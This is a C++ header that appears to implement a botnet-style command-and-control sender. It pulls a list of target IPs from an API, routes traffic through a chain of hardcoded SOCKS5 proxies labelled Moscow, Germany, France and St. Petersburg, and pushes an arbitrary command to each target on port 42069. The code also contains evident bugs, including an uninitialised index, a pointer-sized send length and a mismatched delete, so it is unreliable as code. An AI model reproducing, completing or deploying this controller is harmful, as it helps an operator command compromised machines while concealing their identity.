#pragma once
#include "cpp20_http_client.hpp"
#include <WinSock2.h>
#include <WS2tcpip.h>

std::string ApiConnect(std::string url) {

	http_client::Response r{ http_client::get(url).send() };
	std::string_view body{ r.get_body_string() };
	unsigned first{ body.find(R"({"ips":")") };
	unsigned last{ body.find(R"("})") };
	std::string ips{ body.substr(first,last - first) };

	size_t pos;
	do {
		ips.replace(pos, 1, "\n");
		pos += 1;
	} while ((pos = ips.find(":", pos)) != std::string::npos);

	return ips;

}

namespace SocketUtils { //for stuff i dont want the data for the socket struct to change

	SOCKET connectTarget(SOCKET torsock, const char* host, unsigned short port) {

		char* connectreq = new char[6 + strlen(host)];
		connectreq[0] = 0x05;
		connectreq[1] = 0x01;
		connectreq[2] = 0x00;
		connectreq[3] = 0x03;
		connectreq[4] = (char)strlen(host);
		memcpy(connectreq + 5, host, strlen(host));
		memcpy(connectreq + 5 + strlen(host), &port, 2);

		char response[10];

		send(torsock, connectreq, sizeof(connectreq), 0);
		recv(torsock, response, sizeof(response), 0);
		if (response[1] != 0x00) {
			std::cerr << "Target connection through tor failed" << '\n';
		}

		delete connectreq;
		return torsock;

	}
}

struct Socket {

	SOCKET sock = INVALID_SOCKET;
	WSADATA wsa;

	Socket() = default;

	void Start() {

		if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
			std::cerr << "WSAStartup failed: " << WSAGetLastError() << '\n';
		}
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

		const char* proxips[5];
		proxips[0] = "90.156.142.64"; //Moscow 1
		proxips[1] = "85.214.223.203"; //Germany
		proxips[2] = "51.210.111.216"; //France
		proxips[3] = "178.253.43.167"; //St. Petersburg
		proxips[4] = "90.156.142.47"; //Moscow 2

		unsigned short ports[5];
		ports[0] = 60670; //Moscow 1
		ports[1] = 2024; //Germany
		ports[2] = 26732; //France
		ports[3] = 61551; //St. Petersburg
		ports[4] = 43024; //Moscow 2

		TorConnectAll(proxips, ports, 5);

	}

	void IndividualTorConnect(const char* host, unsigned short port, const char* target, unsigned short targetport) {

		struct sockaddr_in server;
		server.sin_family = AF_INET;
		server.sin_port = htons(port);
		server.sin_addr.s_addr = inet_addr(host);

		if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
			std::cerr << "Connection to TOR proxy server failed" << '\n';
			closesocket(sock);
		}

		char initreq[3]{ 0x05, 0x01, 0x00 };
		char initresponse[2];

		send(sock, initreq, sizeof(initreq), 0);
		recv(sock, initresponse, sizeof(initresponse), 0);
		if (initresponse[0] != 0x05 || initresponse[1] != 0x00) {
			std::cerr << "TOR Init failed" << '\n';
			closesocket(sock);
		}

		char* connectreq = new char[6 + strlen(target)];
		connectreq[0] = 0x05;
		connectreq[1] = 0x01;
		connectreq[2] = 0x00;
		connectreq[3] = 0x03;
		connectreq[4] = (char)strlen(target);
		memcpy(connectreq + 5, target, strlen(target));
		memcpy(connectreq + 5 + strlen(target), &targetport, 2);

		char response[10];

		send(sock, connectreq, sizeof(connectreq), 0);
		recv(sock, response, sizeof(response), 0);
		if (response[1] != 0x00) {
			std::cerr << "TOR Proxy connect failed" << '\n';
			closesocket(sock);
		}

		delete connectreq;

	}

	void TorConnectAll(const char* proxs[], const unsigned short ports[], int proxycount) {

		for (int i = 0; i < proxycount; i++) {
			if (i == 0) {
				IndividualTorConnect(proxs[i], ports[i], proxs[i + 1], ports[i + 1]);
			}
			else if (i < proxycount - 1) {
				IndividualTorConnect(proxs[i], ports[i], proxs[i + 1], ports[i + 1]);
			}
			else {
				IndividualTorConnect(proxs[i], ports[i], nullptr, 0);
			}

			if (sock == INVALID_SOCKET) {
				std::cerr << "Failed to connect through proxy " << i + 1 << '\n';
			}

		}

	}

	void Send(std::string ips, std::string command) {
		
		std::vector<std::string> iplist{};
		std::istringstream stream(ips);
		std::string line{};

		while (std::getline(stream, line)) {
			iplist.push_back(line);
		}

		for (const std::string& ip : iplist) {

			const char* cip = ip.c_str(); //holy shit c++ needs to learn that string is literally just const char* exept its more stable and integrate it into their shit.

			struct sockaddr_in server;
			server.sin_family = AF_INET;
			server.sin_port = htons(42069);
			server.sin_addr.s_addr = inet_addr(cip);

			if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
				std::cerr << "Connection failed to " << ip;
			}
			else {
				const char* ccommand = command.c_str();
				if (send(sock, ccommand, strlen(ccommand), 0) < 0) {
					std::cerr << "Send failed to " << ip;
				}
				else { std::cout << "Command sent to ip " << ip; }
			}

		}

	}

	void Close() {
		closesocket(sock);
	}

};
